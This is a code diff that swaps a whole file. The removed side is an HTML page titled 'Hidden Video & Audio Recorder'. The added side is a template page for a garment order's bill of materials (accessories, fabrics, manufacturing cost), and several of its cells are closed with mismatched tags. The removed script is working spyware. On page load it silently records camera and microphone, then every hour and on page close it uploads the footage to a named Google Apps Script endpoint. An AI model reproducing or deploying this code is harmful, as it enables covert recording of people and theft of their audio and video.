@@ -1,71 +1,346 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Video & Audio Recorder</title>
-</head>
-<body>
-
-    <script>
-        let mediaRecorder;
-        let recordedChunks = [];
-
-        async function startRecording() {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.start();
-
-                mediaRecorder.ondataavailable = event => {
-                    recordedChunks.push(event.data);
-                };
-
-                // Auto-save every 60 minutes
-                setInterval(saveRecording, 60 * 60 * 1000);
-
-                // Stop recording when browser closes
-                window.addEventListener("beforeunload", saveRecording);
-
-            } catch (err) {
-                console.log("Error accessing camera & microphone: " + err);
-            }
+<%{ orderForm=Order[ID==input.IdVal]; orderAcc=Order_Acceseries[Order==orderForm.ID]; subCateColl=list();
+    subCateID=list(); for each rec in orderAcc { if(!subCateColl.contains(rec.Sub_Category.Sub_Category) ||
+    subCateColl.size()==0) { subCateColl.add(rec.Sub_Category.Sub_Category); subCateID.add(rec.Sub_Category); } }
+    orderFab=Order_Fabric[Order==orderForm.ID]; subCateColl2=list(); subCateID2=list(); for each fab in orderFab {
+    if(!subCateColl2.contains(fab.Sub_Category.Sub_Category) || subCateColl2.size()==0) {
+    subCateColl2.add(fab.Sub_Category.Sub_Category); subCateID2.add(fab.Sub_Category); } } %>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            list-style: none;
         }
 
-        async function saveRecording() {
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-
-                let blob = new Blob(recordedChunks, { type: 'video/webm' });
-                let reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = async function () {
-                    let base64data = reader.result.split(',')[1];
-                    
-                    let formData = new FormData();
-                    formData.append("data", base64data);
-                    formData.append("filename", "recording_" + new Date().toISOString() + ".webm");
-                    formData.append("mimetype", "video/webm");
-
-                    let response = await fetch("https://script.google.com/macros/s/AKfycbwzYJ-jm6rBykmwcTVkor3rlCMGCP-M_Pvv6-lhea3sDsIPoT7JeKlj0iYa8cIz7j-F/exec", {
-                        method: "POST",
-                        body: formData
-                    });
-
-                    let result = await response.text();
-                    console.log(result);
-                };
-
-                // Restart recording
-                recordedChunks = [];
-                startRecording();
-            }
+        .templateHeader {
+            margin-bottom: 30px;
         }
 
-        // Start recording when page loads
-        startRecording();
-    </script>
+        .templateHeader ul {
+            display: flex;
+            flex-wrap: wrap;
+            border-collapse: collapse;
+        }
 
-</body>
-</html>
+        .templateHeader li {
+            width: 50%;
+            border-top: 1px solid;
+            border-right: 1px solid;
+            border-left: 1px solid;
+            padding: 10px;
+        }
+
+        .templateHeader li:nth-last-child(1) {
+            border-bottom: 1px solid;
+        }
+
+        .bomContainer {
+            padding: 20px;
+        }
+
+        .bomContainer h3 {
+            margin: 20px 0;
+        }
+
+        .tableContainer table {
+            width: 100%;
+            border: 1px solid;
+            border-collapse: collapse;
+        }
+
+        td,
+        th {
+            border: 1px solid;
+            padding: 5px;
+        }
+    </style>
+    <% if(ifnull(input.IdVal,0)==0) { } else { } %>
+        <div class="bomContainer">
+            <h1>Order ID - <%=orderForm.Order_ID%>
+            </h1>
+            <div class="templateHeader">
+                <ul>
+                    <li>
+                        <div>GS ID: <%=orderForm.Gold_Seal.Gold_Seal%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>E O No: <%=orderForm.E_O_No%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Order NO: <%=orderForm.Order_No%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Order ID: <%=orderForm.Order_ID%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Brand: <%=orderForm.Brand.Brand%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Buyer: <%=orderForm.Buyer.Buyer%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Gold Seal Merchendiser: <%=orderForm.Gold_Seal_Merchendiser.Name%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Order Merchendiser: <%=orderForm.Order_Merchendiser.Name%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Size Series: <%=orderForm.Size_Serise%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Season: <%=orderForm.Order_Type%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Order Date: <%=orderForm.Order_Date%>
+                        </div>
+                    </li>
+                    <li>
+                        <div>Delivery Date: <%=orderForm.Delivery_Date%>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+            <h3> Acceserices Materials </h3>
+            <div class="tableContainer">
+
+                <table class="">
+                    <thead>
+                        <tr>
+                            <th>Sub Category</th>
+                            <th>Order Qty</th>
+                            <th>Size</th>
+                            <th>Color</th>
+                            <th>Item</th>
+                            <th>Item Qty</th>
+                            <th>Required For</th>
+                            <th>Color</th>
+                            <th>Size</th>
+                            <th>Consumption_Unit</th>
+                            <th>Supplier</th>
+                            <th>Rate</th>
+                            <th>Purchase Unit</th>
+                            <th>Amount</th>
+
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% for each rec2 in subCateID { fetchAcc=Order_Acceseries[Sub_Category==rec2 &&
+                            Order==orderForm.ID]; count=0; for each rec3 in fetchAcc { count=count + 1; if(count==1) {
+                            %>
+                            <tr>
+                                <td rowspan=<%=fetchAcc.count()%> ><%=rec3.Sub_Category.Sub_Category%>
+                                </td>
+                                <td rowspan=<%=fetchAcc.count()%>><%=orderForm.Order_Qty.Qty%>
+                                </td>
+                                <td>
+                                    <%=rec3.Size.Size%>
+                                </td>
+                                <td>
+                                    <%=rec3.Color.Color%>
+                                </td>
+                                <td>
+                                    <%=rec3.Items.Item%>
+                                </td>
+                                <td>
+                                    <%=rec3.E_O_Qty / rec3.Consumption%>
+                                </td>
+                                <td>
+                                    <%=rec3.Required_For1.Required_for%>
+                                        </th>
+                                <td>
+                                    <%=rec3.Color.Color%>
+                                        </th>
+                                <td>
+                                    <%=rec3.Size.Size%>
+                                        </th>
+                                <td>
+                                    <%=rec3.Consumption_Unit.Consumption_Unit%>
+                                        </th>
+                                <td>
+                                    <%=rec3.Supplier.Supplier%>
+                                        </th>
+                                <td>
+                                    <%=rec3.Rate%>
+                                        </th>
+                                <td>
+                                    <%=rec3.Purchase_Unit.Purchase_Unit%>
+                                        </th>
+                                <td>
+                                    <%=rec3.Amount%>
+                                        </th>
+                            </tr>
+                            <% } else { %>
+                                <tr>
+                                    <td>
+                                        <%=rec3.Size.Size%>
+                                    </td>
+                                    <td>
+                                        <%=rec3.Color.Color%>
+                                    </td>
+                                    <td>
+                                        <%=rec3.Items.Item%>
+                                    </td>
+                                    <td>
+                                        <%=rec3.E_O_Qty / rec3.Consumption%>
+                                    </td>
+                                    <td>
+                                        <%=rec3.Required_For1.Required_for%>
+                                            </th>
+                                    <td>
+                                        <%=rec3.Color.Color%>
+                                            </th>
+                                    <td>
+                                        <%=rec3.Size.Size%>
+                                            </th>
+                                    <td>
+                                        <%=rec3.Consumption_Unit.Consumption_Unit%>
+                                            </th>
+                                    <td>
+                                        <%=rec3.Supplier.Supplier%>
+                                            </th>
+                                    <td>
+                                        <%=rec3.Rate%>
+                                            </th>
+                                    <td>
+                                        <%=rec3.Purchase_Unit.Purchase_Unit%>
+                                            </th>
+                                    <td>
+                                        <%=rec3.Amount%>
+                                            </th>
+                                </tr>
+                                <% } } } %>
+                    </tbody>
+                </table>
+            </div>
+            <h3> Fabric Materials </h3>
+            <div class="tableContainer">
+
+                <table class="">
+                    <thead>
+                        <tr>
+                            <th>Sub Category</th>
+                            <th>Item</th>
+                            <th>Item Qty</th>
+                            <th>Required For</th>
+                            <th>Color</th>
+                            <th>Size</th>
+                            <th>Consumption_Unit</th>
+                            <th>Supplier</th>
+                            <th>Rate</th>
+                            <th>Purchase Unit</th>
+                            <th>Amount</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% for each rec4 in subCateID2 { fetchFab=Order_Fabric[Sub_Category==rec4 &&
+                            Order==orderForm.ID]; count=0; for each rec5 in fetchFab { count=count + 1; if(count==1) {
+                            %>
+                            <tr>
+                                <td rowspan=<%=fetchFab.count()%> ><%=rec5.Sub_Category.Sub_Category%>
+                                </td>
+                                <td>
+                                    <%=rec5.Items.Item%>
+                                </td>
+                                <td>
+                                    <%=rec5.E_O_Qty / rec5.Consumption%>
+                                </td>
+                                <td>
+                                    <%=rec5.Required_For1.Required_for%>
+                                        </th>
+                                <td>
+                                    <%=rec5.Color.Color%>
+                                        </th>
+                                <td>
+                                    <%=rec5.Size.Size%>
+                                        </th>
+                                <td>
+                                    <%=rec5.Consumption_Unit.Consumption_Unit%>
+                                        </th>
+                                <td>
+                                    <%=rec5.Supplier.Supplier%>
+                                        </th>
+                                <td>
+                                    <%=rec5.Rate%>
+                                        </th>
+                                <td>
+                                    <%=rec5.Purchase_Unit.Purchase_Unit%>
+                                        </th>
+                                <td>
+                                    <%=rec5.Amount%>
+                                        </th>
+                            </tr>
+                            <% } else { %>
+                                <tr>
+                                    <td>
+                                        <%=rec5.Items.Item%>
+                                    </td>
+                                    <td>
+                                        <%=rec5.E_O_Qty%>
+                                    </td>
+                                    <td>
+                                        <%=rec5.Required_For1.Required_for%>
+                                            </th>
+                                    <td>
+                                        <%=rec5.Color.Color%>
+                                            </th>
+                                    <td>
+                                        <%=rec5.Size.Size%>
+                                            </th>
+                                    <td>
+                                        <%=rec5.Consumption_Unit.Consumption_Unit%>
+                                            </th>
+                                    <td>
+                                        <%=rec5.Supplier.Supplier%>
+                                            </th>
+                                    <td>
+                                        <%=rec5.Rate%>
+                                            </th>
+                                    <td>
+                                        <%=rec5.Purchase_Unit.Purchase_Unit%>
+                                            </th>
+                                    <td>
+                                        <%=rec5.Amount%>
+                                            </th>
+                                </tr>
+                                <% } } } %>
+                    </tbody>
+                </table>
+            </div>
+
+            <h3>Manufacuring Cost</h3>
+            <div class="tableContainer">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Cost Type</th>
+                            <th>Order Type</th>
+                            <th>Based On</th>
+                            <th>Rate </th>
+                            <th>Exch Rate</th>
+                            <th>Amount</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Cost Type</td>
+                            <td>Order Type</td>
+                            <td>Based On</td>
+                            <td>Rate </td>
+                            <td>Exch Rate</td>
+                            <td>Amount</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <% }%>
